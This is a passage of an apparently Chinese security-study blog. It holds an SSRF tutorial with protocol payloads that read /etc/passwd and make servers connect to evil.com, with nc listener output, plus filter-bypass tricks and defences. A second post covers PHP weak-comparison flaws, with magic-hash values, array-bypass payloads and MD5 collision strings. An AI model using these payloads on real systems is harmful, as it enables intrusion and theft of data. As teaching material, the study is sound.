<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>

<p><strong>1、file</strong></p>
<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
<blockquote>
<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
</blockquote>
<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
<p><strong>2、dict</strong></p>
<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>3、sftp</strong></p>
<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
<hr>
<h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等。.</p>
<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
<hr>
<h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
<p>一、常见的绕过方式</p>
<p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
<p><strong>2.采用短网址绕过</strong></p>
<blockquote>
<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
</blockquote>
<p><strong>3.采用进制转换</strong></p>
<blockquote>
<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
</blockquote>
<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
<p><strong>4.利用特殊域名</strong></p>
<blockquote>
<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
</blockquote>
<p><strong>5.利用[::]</strong></p>
<blockquote>
<p>可以利用[::]来绕过localhost<br><a target="_blank" rel="noopener" href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p>
</blockquote>
<p><strong>6.利用句号</strong></p>
<blockquote>
<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
</blockquote>
<p><strong>7、CRLF 编码绕过</strong></p>
<blockquote>
<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>

<p><strong>8.利用封闭的字母数字</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>

<p>二、常见限制</p>
<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
<blockquote>
<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
</blockquote>
<p>2.限制请求IP不为内网地址</p>
<blockquote>
<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
</blockquote>
<p>3.限制请求只为http协议</p>
<blockquote>
<p>（1）采取302跳转<br>（2）采取短地址</p>
</blockquote>
<hr>
<h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p>
<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmaxy8gbh0005kg7kdm60erqf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/PHP比较漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP比较漏洞"><a href="#PHP比较漏洞" class="headerlink" title="PHP比较漏洞"></a>PHP比较漏洞</h1><h1 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.comparison.php">php</a>中有两种比较的符号 <code>==</code>​ 与 <code>===</code>​</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	<span class="variable">$a</span> == <span class="variable">$b</span>;  <span class="comment">// ==  在进行比较的时候，会先将字符串类型转化成相同，再比较</span></span><br><span class="line">	<span class="variable">$a</span> === <span class="variable">$b</span>; <span class="comment">// === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;PHP 8.0.0 之前，如果 string 与数字或者以数字开头的字符串进行比较， 则在&#x3D;&#x3D;​**&#x3D;&#x3D;比较前会将 string 转化为数字&#x3D;&#x3D;**​&#x3D;&#x3D;。&#x3D;&#x3D;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174634-5opnoh2.png" alt="image"></p>
<p><img src="/.com//image-20250417174637-541lm5p.png" alt="image"></p>
<p>实验结果：</p>
<ol>
<li>​<code>&quot;admin&quot;==0</code>​ 比较的时候，会将字符串<code>admin</code>​强制转化成整数<code>0</code>​</li>
<li>​<code>&quot;1admin&quot;==1</code>​ 比较的时候，会将字符串<code>1admin</code>​强制转化成整数<code>1</code>​</li>
<li>字符串<code>admin1</code>​强制转化成整数<code>0</code>​</li>
<li>​<code>&quot;0e123456&quot;==&quot;0e456789&quot;</code>​比较的时候，PHP会将开头为<code>0e</code>​这类字符串识别为科学计数法的数字，<code>0e123456</code>​相当于<code>&lt;span class=&quot;ne-text&quot;&gt;0*10&lt;/span&gt;&lt;sup&gt;123456&lt;/sup&gt;&lt;span class=&quot;ne-text&quot;&gt; = 0&lt;/span&gt;</code>​，同理，<code>0e456789=0</code>​，所以两者相等。</li>
</ol>
<blockquote>
<p>注意：例子中的字符串还有一个特征，<code>0e</code>​后面字符全是数字，才能漏洞利用，否则例如<code>0e3f2c44</code>​仍然会被识别成字符串。</p>
</blockquote>
<h1 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h1><p><img src="/.com//image-20250417174658-89jjpnd.png" alt="image"></p>
<p><img src="/.com//image-20250417174701-vej9ys6.png" alt="image"></p>
<p>&#x3D;&#x3D;当字符串被强制转化为数值，其结果和类型如下:&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;如果该字符串没有包含&#x3D;&#x3D;​&#x3D;&#x3D;​<code>&#39;.&#39;, e, E</code>​&#x3D;&#x3D;​&#x3D;&#x3D;并且其数值在整形范围之内，该字符串作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>int</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值，其他所有情况下都被作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>float</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值；&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。&#x3D;&#x3D;</p>
<p>也印证了实验1中通过<code>&quot;admin1&quot;==1 =&gt;False</code>​</p>
<h1 id="0e绕过弱比较-MD5和SHA1函数漏洞"><a href="#0e绕过弱比较-MD5和SHA1函数漏洞" class="headerlink" title="0e绕过弱比较-MD5和SHA1函数漏洞"></a>0e绕过弱比较-MD5和SHA1函数漏洞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp;<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">  </span><br><span class="line">(<span class="title function_ invoke__">sha1</span>(<span class="variable">$s1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$s2</span>) &amp;&amp; <span class="variable">$s1</span>!=<span class="variable">$s2</span>)</span><br></pre></td></tr></table></figure>

<p>​<code>sha1</code>​和<code>md5</code>​属于哈希编码，在<code>PHP</code>​中，这两种编码是存在绕过漏洞的。</p>
<p>PHP在处理哈希字符串时，利用<code>!=</code>​或<code>==</code>​来对哈希值进行比较，把以<code>0e</code>​开头的哈希值都解释为<code>0</code>​，所以如果两个不同的密码经过哈希加密后，其哈希值都是以<code>0e</code>​开头的，那么<code>0e</code>​将会认为他们相同，都是<code>0</code>​。只需要传入开头都是<code>0e</code>​的两个值，比如<code>$s1=QNKCDZO</code>​,<code> $s2=240610708</code>​, 便可成功绕过。</p>
<p>利用<code>0e</code>​绕过方式只有在弱比较的时候才能使用。</p>
<h1 id="实验3"><a href="#实验3" class="headerlink" title="实验3"></a>实验3</h1><p><img src="/.com//image-20250417174743-u6bmulp.png" alt="image"></p>
<p><img src="/.com//image-20250417174746-61l5osn.png" alt="image"></p>
<p>以下值在<code>md5</code>​加密后以<code>0e</code>​开头：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>

<p>验证</p>
<p><img src="/.com//image-20250417174803-33e2qv1.png" alt="image"></p>
<p>批量验证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;QNKCDZO&#x27;</span>, <span class="string">&#x27;240610708&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s878926199a&#x27;</span>, <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s214587387a&#x27;</span>, <span class="string">&#x27;s214587387a&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174815-hvdrbp5.png" alt="image"></p>
<p>以下值在<code>sha1</code>​加密后以<code>0e</code>​开头</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;aaroZmOk&#x27;</span>, <span class="string">&#x27;aaK1STfY&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaO8zKZF&#x27;</span>, <span class="string">&#x27;aa3OFF9m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0e1290633704&#x27;</span>, <span class="string">&#x27;10932435112&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">sha1</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174829-y4ysat8.png" alt="image"></p>
<p>双重<code>MD5</code>​加密后<code>0e</code>​开头：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;7r4lGXCH2Ksu2JNT3BYM&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CbDLytmyGm2xQyaLNhWn&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;770hQgrBOjrcqftrlaZk&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(cipher.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417174839-vxse526.png" alt="image"></p>
<blockquote>
<p>其它情况：会限制字符串为纯数字或字母</p>
</blockquote>
<p>‍</p>
<h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><p>对于php强比较和弱比较：<code>md5()</code>​，<code>sha1()</code>​函数无法处理数组，如果传入的为数组，会返回<code>NULL</code>​，所以两个数组经过加密后得到的都是<code>NULL</code>​，也就是相等的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>​<code>payload: ?a[]=1&amp;b[]=2	</code>​</p>
<p>‍</p>
<h1 id="实验4"><a href="#实验4" class="headerlink" title="实验4"></a>实验4</h1><p><img src="/.com//image-20250417174912-0qsam45.png" alt="image"></p>
<p><img src="/.com//image-20250417174914-tik3goc.png" alt="image"></p>
<p>‍</p>
<h1 id="实验5"><a href="#实验5" class="headerlink" title="实验5"></a>实验5</h1><p>查看报错信息去验证上述结论</p>
<p><img src="/.com//image-20250417174924-ovxj2mz.png" alt="image"></p>
<p><img src="/.com//image-20250417174927-4udg3hc.png" alt="image"></p>
<p>​<code>md5()</code>​函数希望接受的是字符串而不是数组。</p>
<p>‍</p>
<h1 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; </span><br><span class="line">   <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>比较<code>a</code>​，<code>b</code>​时会将<code>a</code>​，<code>b</code>​转换为字符串比较，就不能用数组绕过了。因为数组转换为字符串时都会变成<code>&quot;Array&quot;</code>​。</p>
<p>‍</p>
<h1 id="实验6"><a href="#实验6" class="headerlink" title="实验6"></a>实验6</h1><p><img src="/.com//image-20250417174950-8fwszbt.png" alt="image"></p>
<p><img src="/.com//image-20250417174953-l3vi7qb.png" alt="image"></p>
<p>因为数组要求构造a和b不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。所以我们只能用MD5碰撞来实现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"><span class="variable">$b</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="实验7"><a href="#实验7" class="headerlink" title="实验7"></a>实验7</h1><p><img src="/.com//image-20250417175005-bwx4402.png" alt="image"></p>
<p><img src="/.com//image-20250417175008-g6uw5ex.png" alt="image"></p>
<p>‍</p>
<p>文件：</p>
<p>linux使用md5collgen碰撞生成两个md5值相同但内容不同的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -o <span class="number">1</span>.bin <span class="number">2</span>.bin</span><br></pre></td></tr></table></figure>

